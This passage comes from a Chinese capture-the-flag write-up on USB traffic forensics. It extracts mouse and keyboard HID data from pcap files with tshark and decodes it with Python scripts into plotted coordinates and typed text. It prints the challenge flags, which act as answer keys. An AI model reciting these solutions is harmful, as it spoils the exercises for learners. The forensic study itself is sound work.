alt="在这里插入图片描述"><br>剔除空行，亲身经历，这步很重要，包含空行会得到错误结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>没有冒号，使用脚本添加冒号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">fi</span>=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> 1:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==8: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(a),2):<br>                <span class="hljs-keyword">if</span> i+2 != len(a):<br>                    out+=a[i]+a[i+1]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+1]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p>运行脚本，得到out.txt<br><img src="https://img-blog.csdnimg.cn/20210405125011771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用mouse.py脚本，通过更改btn_flag的值来测试鼠标左右键</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;xy.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>posx = <span class="hljs-number">0</span><br>posy = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">12</span> :<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>],<span class="hljs-number">16</span>)<br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">127</span> :<br>        x -= <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> y &gt; <span class="hljs-number">127</span> :<br>        y -= <span class="hljs-number">256</span><br>    posx += x<br>    posy += y<br>    btn_flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment"># 1 for left , 2 for right , 0 for nothing</span><br>    <span class="hljs-keyword">if</span> btn_flag == <span class="hljs-number">2</span> : <span class="hljs-comment"># 1 代表左键</span><br>        f.write(<span class="hljs-built_in">str</span>(posx))<br>        f.write(<span class="hljs-string">&#x27; &#x27;</span>)<br>        f.write(<span class="hljs-built_in">str</span>(posy))<br>        f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br></code></pre></td></tr></table></figure><p>经过测试是鼠标右键流量，在生成的xy.txt中可以得到坐标：<br><img src="https://img-blog.csdnimg.cn/20210412192227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看了<a href="https://blog.csdn.net/qq_45555226/article/details/102810474">大师傅的wp</a>，发现我们添加冒号得到的内容不一样</p><p><img src="https://img-blog.csdnimg.cn/20210412162949750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>大师傅直接提取鼠标流量，含有冒号，而我提取出来的不含冒号，是Wireshark版本不同的缘故，在网上找到老版本的Wireshark</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Wireshark-win64-2.4.3<br>https://pan.baidu.com/s/1nvIIKpr<br>密码：5uao<br></code></pre></td></tr></table></figure><p>提取流量得到usbdata.txt,包含冒号：<img src="https://img-blog.csdnimg.cn/20210412163509262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接使用上面的mouse.py脚本，即可得到xy.txt。<br><img src="https://img-blog.csdnimg.cn/20210412164602929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入gnuplot工具，把xy.txt文本里的坐标转化为图片<br><img src="https://img-blog.csdnimg.cn/20210412165000484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>翻转一下图片<br><img src="https://img-blog.csdnimg.cn/20210412165426744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">XNCA&#123;U2BPCAPCETEVERYTHING&#125;<br></code></pre></td></tr></table></figure><p>也可以利用python脚本画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x, y = np.loadtxt(<span class="hljs-string">&#x27;xy.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27; &#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210412200559583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。</p><p>击键信息集中在第3个字节，每次击键都会产生一个数据包。</p><p><a href="https://max.book118.com/html/2017/0407/99227972.shtm">参考文档</a>：USB keyboard映射表<br><img src="https://img-blog.csdnimg.cn/20210405115902138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="实战练习-1"><a href="#实战练习-1" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag信息一般隐藏在USB流量中，通过USB协议数据中的键盘键码转换成键位。</p><p><strong>题目1：</strong><br>分析流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>tshark提取USB流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p>usbdata.txt文件内容<br><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现提取出来包含空行，使用命令剔除空行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt空余行消失<br><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。有冒号时提取数据的<code>[6:8]</code>，无冒号时数据在<code>[4:6]</code></p><p>可以利用脚本加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在网上找到两个键盘流量脚本</p><p>keyboard1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>运行脚本得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard.py                 <br>output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>因为[DEL]是删除键，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>keyboard2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span 